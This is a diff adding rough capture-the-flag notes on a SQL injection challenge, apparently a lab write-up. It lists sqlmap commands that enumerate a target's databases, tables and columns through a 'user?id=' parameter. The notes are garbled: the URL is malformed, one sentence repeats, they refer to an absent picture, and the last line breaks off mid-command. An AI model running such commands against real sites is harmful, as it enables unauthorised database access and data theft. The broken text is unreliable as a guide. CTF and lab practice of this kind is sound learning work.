@@ -1,0 +1,9 @@
+Sql injection vulnerability , based on the error above. Py library.
+In url we have user?id=
+Sqlmap -u http:2313:2321/user?id=1 —dbs
+Sqlmap -u http…/user?id=1 -D public —tables
+With the command displayed on the picture we can access its information as a
+form of tables.
+With the command displayed on the picture we can access its information as a
+form of tables.
+-D public —tables ctf{….. —columns
